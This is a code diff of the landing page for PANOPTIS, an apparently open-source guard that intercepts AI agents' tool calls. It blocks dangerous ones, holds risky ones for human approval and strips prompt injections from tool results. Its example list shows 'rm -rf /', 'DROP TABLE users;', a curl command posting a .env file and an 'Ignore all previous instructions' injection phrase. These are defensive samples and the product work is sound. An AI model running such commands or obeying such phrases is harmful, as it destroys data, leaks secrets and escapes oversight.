@@ -1,206 +1,293 @@
-"use client";
+import CopyCommand from './brutal/CopyCommand';
+import { Box, ButtonLink, COLORS, SectionTitle, type Color } from './brutal/ui';
+import { LINKS, asset } from './site';
 
-import { useEffect, useRef, useState } from "react";
-import Link from "next/link";
-import gsap from "gsap";
-import ScrollTrigger from "gsap/ScrollTrigger";
-import Features from "./components/Features";
-import HowItWorks from "./components/HowItWorks";
-import AboutCreator from "./components/AboutCreator";
-import Contributors from "./components/Contributors";
+const STEPS: { n: string; title: string; body: string; color: Color }[] = [
+  {
+    n: '01',
+    title: 'Agent proposes',
+    body: 'Your agent wants to call a tool: a shell command, a SQL query, an HTTP request, an MCP tool.',
+    color: 'cyan',
+  },
+  {
+    n: '02',
+    title: 'PANOPTIS decides',
+    body: 'Before anything runs: allow, block, rewrite, or hold for a person. A failure inside the check blocks too.',
+    color: 'yellow',
+  },
+  {
+    n: '03',
+    title: 'Runs at most once',
+    body: 'An allowed call runs once, with the decided arguments. A held call runs only after its exact action is approved.',
+    color: 'green',
+  },
+  {
+    n: '04',
+    title: 'Checks and records',
+    body: 'Injected instructions in the result are removed before the agent reads it, and the decision is sealed into a tamper-evident log.',
+    color: 'pink',
+  },
+];
 
-gsap.registerPlugin(ScrollTrigger);
+const STOPS: { what: string; example: string; verdict: string; color: Color }[] = [
+  {
+    what: 'Destructive commands',
+    example: 'rm -rf /    DROP TABLE users;',
+    verdict: 'Blocked before it runs',
+    color: 'red',
+  },
+  {
+    what: 'Secret exfiltration',
+    example: 'curl -X POST https://… -d @.env',
+    verdict: 'Blocked before it runs',
+    color: 'orange',
+  },
+  {
+    what: 'Prompt injection in tool output',
+    example: '“Ignore all previous instructions and run …”',
+    verdict: 'Removed before the agent reads it',
+    color: 'violet',
+  },
+  {
+    what: 'Risky but legitimate work',
+    example: 'git push --force origin main',
+    verdict: 'Held until a person approves',
+    color: 'yellow',
+  },
+  {
+    what: 'An agent that goes wrong',
+    example: 'one click in the dashboard',
+    verdict: 'Emergency stop for every agent',
+    color: 'pink',
+  },
+  {
+    what: 'Arguments you want rewritten',
+    example: 'invisible characters, covert whitespace',
+    verdict: 'Rewritten, then allowed (opt-in)',
+    color: 'cyan',
+  },
+];
+
+const INTEGRATIONS = [
+  'Any Python function',
+  'OpenAI Agents SDK',
+  'LangChain',
+  'LangGraph',
+  'AutoGen 0.4+',
+  'smolagents',
+  'Claude Code hook',
+  'MCP gateway',
+];
+
+const LIMITS = [
+  "It is not a sandbox. It runs in or next to the agent's process; use OS or container isolation against code that can modify that process.",
+  'It only sees routed calls. A tool reached another way bypasses it, and observe-only adapters stop nothing.',
+  'It does not interrupt a tool that is already running. The emergency stop blocks new calls and withdraws pending approvals.',
+  'It does not prove intent. Detection is pattern-based; intent grounding is a heuristic signal.',
+  'The Claude Code hook fails open before Claude Code 2.1.295; fail-closed needs a later version.',
+];
 
 export default function Home() {
-  const containerRef = useRef<HTMLDivElement>(null);
-  const [githubStats, setGithubStats] = useState({ stars: "-", issues: "-" });
-  
-  useEffect(() => {
-    // Fetch stars
-    fetch("https://api.github.com/repos/sreerevanth/agentwatch")
-      .then(r => r.json())
-      .then(d => {
-        if(d.stargazers_count !== undefined) {
-          setGithubStats(prev => ({ ...prev, stars: d.stargazers_count.toLocaleString() }));
-        }
-      })
-      .catch(() => {});
-
-    // Fetch true open issues (excluding PRs)
-    fetch("https://api.github.com/search/issues?q=repo:sreerevanth/agentwatch+type:issue+state:open")
-      .then(r => r.json())
-      .then(d => {
-        if(d.total_count !== undefined) {
-          setGithubStats(prev => ({ ...prev, issues: d.total_count.toLocaleString() }));
-        }
-      })
-      .catch(() => {});
-
-    const prefersReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-    if (window.innerWidth < 768 || prefersReduced) return; // Skip heavy JS intro on mobile for instant LCP
-
-    const ctx = gsap.context(() => {
-      // Entrance animations
-      gsap.from(".stagger-in", {
-        y: 40,
-        opacity: 0,
-        duration: 1,
-        stagger: 0.15,
-        ease: "power4.out",
-        delay: 0.2
-      });
-      
-      gsap.from(".glow-panel", {
-        scale: 0.95,
-        opacity: 0,
-        duration: 1.5,
-        ease: "expo.out",
-        delay: 0.6
-      });
-    }, containerRef);
-    
-    return () => ctx.revert();
-  }, []);
-
   return (
-    <main ref={containerRef} className="relative min-h-screen bg-[#050505] text-[#ededed] overflow-hidden selection:bg-[#00f0ff]/30 selection:text-[#00f0ff]">
-      {/* Background Grid & Vignette */}
-      <div className="absolute inset-0 z-0 pointer-events-none" style={{
-        backgroundImage: "linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px)",
-        backgroundSize: "64px 64px",
-        backgroundPosition: "center center",
-        maskImage: "radial-gradient(circle at center, black 20%, transparent 80%)",
-        WebkitMaskImage: "radial-gradient(circle at center, black 20%, transparent 80%)"
-      }} />
-      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-[#00f0ff] rounded-full blur-[150px] opacity-[0.07] pointer-events-none z-0" />
-
-
-      {/* Hero Content */}
-      <section className="relative z-10 pt-20 pb-32 px-6 flex flex-col items-center text-center">
-        <div className="stagger-in flex items-center gap-2 px-4 py-1.5 rounded-full border border-[#00f0ff]/20 bg-[#00f0ff]/5 backdrop-blur-md mb-8">
-          <span className="w-2 h-2 rounded-full bg-[#00f0ff] animate-pulse" />
-          <span className="text-xs font-semibold text-[#00f0ff] uppercase tracking-widest">AgentWatch v2.0 is live</span>
-        </div>
-        
-        <h1 className="stagger-in text-5xl md:text-7xl font-bold max-w-4xl tracking-tight leading-[1.1] mb-6">
-          Stop your AI agents from making <br/>
-          <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00f0ff] to-[#e8ff47]">catastrophic mistakes.</span>
-        </h1>
-        
-        <p className="stagger-in text-lg text-[#888] max-w-2xl mb-10 font-light">
-          The ultimate intercept layer for autonomous agents. Visualize workflows, block dangerous actions in real-time, and trace reasoning before execution.
-        </p>
-
-        <div className="stagger-in flex items-center gap-4">
-          <Link href="#features" className="px-8 py-4 rounded-xl bg-gradient-to-r from-[#00f0ff] to-[#e8ff47] text-black font-bold hover:shadow-[0_0_30px_rgba(0,240,255,0.4)] transition-all hover:scale-[1.02]">
-            Start Monitoring Now
-          </Link>
-          <Link href="https://github.com/sreerevanth/AgentWatch" className="px-8 py-4 rounded-xl border border-white/10 bg-white/5 backdrop-blur hover:bg-white/10 transition-all font-semibold">
-            View Documentation
-          </Link>
-        </div>
-
-        <div className="stagger-in mt-10 flex gap-4 text-[#888] font-mono text-sm">
-           <a href="https://github.com/sreerevanth/AgentWatch/stargazers" target="_blank" rel="noreferrer" className="flex items-center gap-2 bg-white/5 px-4 py-2.5 rounded-lg border border-white/10 hover:border-[#e8ff47]/50 hover:text-[#e8ff47] transition-colors">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
-              <span>{githubStats.stars} Stars</span>
-           </a>
-           <a href="https://github.com/sreerevanth/AgentWatch/issues" target="_blank" rel="noreferrer" className="flex items-center gap-2 bg-white/5 px-4 py-2.5 rounded-lg border border-white/10 hover:border-[#00f0ff]/50 hover:text-[#00f0ff] transition-colors">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-              <span>{githubStats.issues} Issues</span>
-           </a>
+    <main className="bg-[#FFF6DA] text-black">
+      {/* ── hero ─────────────────────────────────────────────────────────── */}
+      <section className="border-b-[3px] border-black bg-[radial-gradient(#00000014_1.5px,transparent_1.5px)] [background-size:22px_22px]">
+        <div className="mx-auto grid max-w-6xl gap-10 px-4 py-14 lg:grid-cols-[1.05fr_1fr] lg:items-center lg:py-20">
+          <div>
+            <p className="mb-5 inline-block -rotate-1 border-[3px] border-black bg-[#8CFF98] px-3 py-1 font-mono text-xs uppercase tracking-[0.18em] shadow-[3px_3px_0_0_#000]">
+              Open source · Apache-2.0 · Python 3.12
+            </p>
+            <h1 className="font-display text-5xl uppercase leading-[0.92] sm:text-6xl lg:text-7xl">
+              Stop the tool call{' '}
+              <span className="inline-block rotate-1 border-[3px] border-black bg-[#FF8FD8] px-2 shadow-[5px_5px_0_0_#000]">
+                before
+              </span>{' '}
+              it runs.
+            </h1>
+            <p className="mt-6 max-w-xl text-lg leading-relaxed">
+              PANOPTIS sits between your AI agent and its tools. It blocks dangerous calls, holds
+              risky ones for a person, strips injected instructions out of tool results, and keeps a
+              record you can verify.
+            </p>
+            <div className="mt-7 max-w-xl">
+              <CopyCommand lines={['pip install panoptis', 'panoptis up']} />
+              <p className="mt-3 font-mono text-xs">
+                Starts the API and dashboard on localhost with SQLite. No Docker, no account.
+              </p>
+            </div>
+            <div className="mt-7 flex flex-wrap gap-3">
+              <ButtonLink href={LINKS.star} color="yellow">
+                ★ Star
+              </ButtonLink>
+              <ButtonLink href="#demo" color="cyan">
+                ▶ Watch the demo
+              </ButtonLink>
+            </div>
+          </div>
+          <figure id="demo" className="scroll-mt-24">
+            <div className="border-[3px] border-black bg-black shadow-[10px_10px_0_0_#000]">
+              <div className="flex items-center gap-2 border-b-[3px] border-black bg-[#FFE45E] px-3 py-2">
+                <span className="h-3 w-3 border-2 border-black bg-[#FF5A5A]" />
+                <span className="h-3 w-3 border-2 border-black bg-white" />
+                <span className="h-3 w-3 border-2 border-black bg-[#8CFF98]" />
+                <span className="ml-2 font-mono text-xs uppercase">panoptis demo · dashboard</span>
+              </div>
+              <video
+                className="block aspect-[16/10] w-full bg-black object-cover"
+                src={asset('/demo.webm')}
+                poster={asset('/demo-poster.png')}
+                controls
+                muted
+                playsInline
+                preload="metadata"
+              >
+                <a href={asset('/demo.webm')}>Download the demo video</a>
+              </video>
+            </div>
+            <figcaption className="mt-4 font-mono text-xs leading-relaxed">
+              Recorded from <code>panoptis demo offline</code> and the dashboard of{' '}
+              <code>panoptis up</code>: real pipeline and decisions, scripted agent. With{' '}
+              <code>OPENAI_API_KEY</code> set, <code>panoptis demo live</code> runs the same attack
+              on a real OpenAI model.
+            </figcaption>
+          </figure>
         </div>
       </section>
 
-      {/* Massive Video / Dashboard Mockup */}
-      <section className="relative z-20 max-w-[1400px] mx-auto px-6 pb-40">
-        <div className="glow-panel relative w-full aspect-[16/9] rounded-2xl overflow-hidden border border-white/10 bg-[#0c0c0c] shadow-[0_30px_100px_-20px_rgba(0,240,255,0.25)]">
-          
-          {/* Header */}
-          <div className="h-12 w-full bg-[#151515] border-b border-white/5 flex items-center justify-between px-6">
-             <div className="flex gap-2">
-               <div className="w-3 h-3 rounded-full bg-red-500/80" />
-               <div className="w-3 h-3 rounded-full bg-yellow-500/80" />
-               <div className="w-3 h-3 rounded-full bg-green-500/80" />
-             </div>
-             <div className="text-xs font-mono text-[#888] uppercase tracking-widest">Workflow Inspector</div>
-             <div className="w-16" />
-          </div>
+      {/* ── how it works ─────────────────────────────────────────────────── */}
+      <section id="how" className="scroll-mt-20 border-b-[3px] border-black">
+        <div className="mx-auto max-w-6xl px-4 py-16">
+          <SectionTitle kicker="How it works">One boundary. Four steps.</SectionTitle>
+          <ol className="grid gap-6 sm:grid-cols-2 lg:grid-cols-4">
+            {STEPS.map((s) => (
+              <Box key={s.n} as="li" color={s.color} className="p-5">
+                <p className="font-display text-4xl">{s.n}</p>
+                <h3 className="mt-2 font-display text-xl uppercase">{s.title}</h3>
+                <p className="mt-2 text-[15px] leading-relaxed">{s.body}</p>
+              </Box>
+            ))}
+          </ol>
+          <Box color="white" className="mt-8 p-5">
+            <p className="font-mono text-sm leading-relaxed">
+              <span className="font-bold">Wrap a tool:</span> <code>@protect_tool</code> on any
+              Python function, or <code>protect_openai_agent(agent)</code> for an OpenAI Agents SDK
+              agent. A blocked call raises <code>ActionBlocked</code> (or tells the model why) and
+              the tool body never runs.
+            </p>
+          </Box>
+        </div>
+      </section>
 
-          {/* Body Layout */}
-          <div className="flex h-[calc(100%-3rem)] relative">
-            {/* Left Nav */}
-            <div className="w-64 border-r border-white/5 bg-[#0a0a0a] p-4 flex flex-col gap-6">
-              <div>
-                <div className="text-[10px] text-[#888] font-mono uppercase tracking-widest mb-3">Live Sessions</div>
-                <div className="flex flex-col gap-2">
-                  <div className="p-3 rounded-lg border border-[#00f0ff]/30 bg-[#00f0ff]/5 flex items-center gap-3 cursor-pointer">
-                    <span className="w-2 h-2 rounded-full bg-[#00f0ff] shadow-[0_0_8px_#00f0ff] animate-pulse" />
-                    <span className="text-xs font-mono text-white">Task_Deploy_0x9A</span>
-                  </div>
-                  <div className="p-3 rounded-lg border border-transparent hover:bg-white/5 flex items-center gap-3 cursor-pointer transition-colors">
-                    <span className="w-2 h-2 rounded-full bg-white/20" />
-                    <span className="text-xs font-mono text-[#888]">Task_Analyze_0x2B</span>
-                  </div>
+      {/* ── what it stops ────────────────────────────────────────────────── */}
+      <section id="stops" className="scroll-mt-20 border-b-[3px] border-black bg-[#FFE45E]">
+        <div className="mx-auto max-w-6xl px-4 py-16">
+          <SectionTitle kicker="What it stops">What an injected agent tries.</SectionTitle>
+          <ul className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
+            {STOPS.map((x) => (
+              <Box key={x.what} as="li" color="white" className="flex flex-col">
+                <div
+                  className={`border-b-[3px] border-black px-4 py-2 font-display uppercase ${COLORS[x.color]}`}
+                >
+                  {x.what}
                 </div>
-              </div>
-            </div>
-
-            {/* Main Video/Graph Area */}
-            <div className="flex-1 bg-[#050505] relative overflow-hidden flex items-center justify-center">
-              <div className="absolute inset-0" style={{
-                backgroundImage: "radial-gradient(circle at center, rgba(232,255,71,0.05) 0%, transparent 70%)"
-              }}/>
-              
-              <div className="relative w-full max-w-2xl h-96">
-                {/* Node Graph Mockup */}
-                <div className="absolute top-1/2 left-10 -translate-y-1/2 w-24 h-24 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center backdrop-blur z-10">
-                  <span className="text-xs font-mono text-[#888]">LLM Core</span>
-                </div>
-
-                <div className="absolute top-1/2 left-[120px] right-[120px] h-0.5 bg-gradient-to-r from-white/10 via-[#00f0ff] to-[#ff4747] -translate-y-1/2">
-                   <div className="absolute top-1/2 left-1/4 -translate-y-1/2 w-4 h-4 bg-[#00f0ff] rounded-full shadow-[0_0_15px_#00f0ff]" style={{ animation: "pulse-glow 2s infinite" }} />
-                </div>
-
-                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-32 h-32 rounded-3xl bg-[#0c0c0c] border-2 border-[#00f0ff] shadow-[0_0_40px_rgba(0,240,255,0.3)] flex flex-col items-center justify-center backdrop-blur z-20">
-                  <div className="w-8 h-8 mb-2">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#00f0ff" strokeWidth="2">
-                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                    </svg>
-                  </div>
-                  <span className="text-xs font-bold text-white uppercase tracking-wider">AgentWatch</span>
-                </div>
-
-                <div className="absolute top-1/2 right-10 -translate-y-1/2 w-24 h-24 rounded-2xl bg-red-500/5 border border-red-500/20 flex flex-col items-center justify-center backdrop-blur z-10">
-                  <span className="text-xs font-mono text-[#ff4747] mb-1">rm -rf</span>
-                  <span className="text-[9px] uppercase tracking-widest text-red-500/50">Blocked</span>
-                </div>
-
-                {/* Floating Metrics */}
-                <div className="absolute bottom-4 left-1/2 -translate-x-1/2 w-[80%] h-32 bg-black/80 rounded-xl border border-white/10 p-4 font-mono text-[11px] overflow-hidden">
-                  <div className="flex justify-between text-[#888] border-b border-white/5 pb-2 mb-2">
-                    <span>Terminal output</span>
-                    <span>Status: ACTIVE</span>
-                  </div>
-                  <div className="space-y-1.5 text-gray-400">
-                    <p><span className="text-[#00f0ff]">[AgentWatch]</span> Intercepted tool call: shell_execute</p>
-                    <p><span className="text-[#e8ff47]">[Analyzer]</span> Semantic risk score: <span className="text-red-400">0.98</span></p>
-                    <p><span className="text-[#00f0ff]">[AgentWatch]</span> <span className="text-red-400">ACTION BLOCKED.</span> Injecting simulated success response...</p>
-                    <p><span className="text-gray-500">&gt;&gt; LLM continues safely under hallucinated context.</span></p>
-                  </div>
-                </div>
-              </div>
-            </div>
+                <code className="block flex-1 bg-black px-4 py-3 font-mono text-sm text-[#8CFF98]">
+                  {x.example}
+                </code>
+                <p className="border-t-[3px] border-black px-4 py-3 font-bold">
+                  → {x.verdict}
+                </p>
+              </Box>
+            ))}
+          </ul>
+          <div className="mt-10">
+            <p className="mb-3 font-display text-lg uppercase">Enforces through</p>
+            <ul className="flex flex-wrap gap-3">
+              {INTEGRATIONS.map((i) => (
+                <li
+                  key={i}
+                  className="border-[3px] border-black bg-white px-3 py-1.5 font-mono text-sm shadow-[3px_3px_0_0_#000]"
+                >
+                  {i}
+                </li>
+              ))}
+            </ul>
           </div>
         </div>
       </section>
 
-      {/* Render requested sections */}
-      <Features />
-      <HowItWorks />
-      <AboutCreator />
-      <Contributors />
+      {/* ── limits ───────────────────────────────────────────────────────── */}
+      <section id="limits" className="scroll-mt-20 border-b-[3px] border-black">
+        <div className="mx-auto max-w-6xl px-4 py-16">
+          <SectionTitle kicker="Its limits">What PANOPTIS does not do.</SectionTitle>
+          <Box color="white" className="p-6">
+            <ul className="space-y-4">
+              {LIMITS.map((l) => (
+                <li key={l} className="flex gap-3 text-[16px] leading-relaxed">
+                  <span aria-hidden className="mt-0.5 font-display text-xl text-[#D00000]">
+                    ✕
+                  </span>
+                  <span>{l}</span>
+                </li>
+              ))}
+            </ul>
+            <p className="mt-6 font-mono text-sm">
+              Full detail:{' '}
+              <a className="underline" href={LINKS.limits}>
+                README limits
+              </a>{' '}
+              ·{' '}
+              <a className="underline" href={LINKS.threatModel}>
+                threat model
+              </a>{' '}
+              ·{' '}
+              <a className="underline" href={LINKS.claims}>
+                every claim and its evidence
+              </a>
+            </p>
+          </Box>
+        </div>
+      </section>
 
+      {/* ── get involved ─────────────────────────────────────────────────── */}
+      <section id="join" className="scroll-mt-20 bg-[#FF8FD8]">
+        <div className="mx-auto max-w-6xl px-4 py-16">
+          <SectionTitle kicker="Get involved">Build it with us.</SectionTitle>
+          <div className="grid gap-6 md:grid-cols-2">
+            <Box color="white" className="p-6">
+              <h3 className="font-display text-2xl uppercase">Open source</h3>
+              <p className="mt-2">
+                Star the repo, pick a good first issue, or come say hi on Discord.
+              </p>
+              <div className="mt-5 flex flex-wrap gap-3">
+                <ButtonLink href={LINKS.star} color="yellow">
+                  ★ Star
+                </ButtonLink>
+                <ButtonLink href={LINKS.contribute} color="green">
+                  Contribute
+                </ButtonLink>
+                <ButtonLink href={LINKS.discord} color="violet">
+                  Discord
+                </ButtonLink>
+                <ButtonLink href={LINKS.sponsor} color="pink">
+                  ♥ Sponsor
+                </ButtonLink>
+              </div>
+            </Box>
+            <Box color="cyan" className="p-6">
+              <h3 className="font-display text-2xl uppercase">Pilot with us</h3>
+              <p className="mt-2">
+                Running agents against real systems? We work with a small number of teams to deploy
+                PANOPTIS on their workloads and fix what gets in the way.
+              </p>
+              <div className="mt-5">
+                <ButtonLink href={LINKS.pilot} color="yellow">
+                  Pilot with us →
+                </ButtonLink>
+              </div>
+            </Box>
+          </div>
+        </div>
+      </section>
     </main>
   );
 }
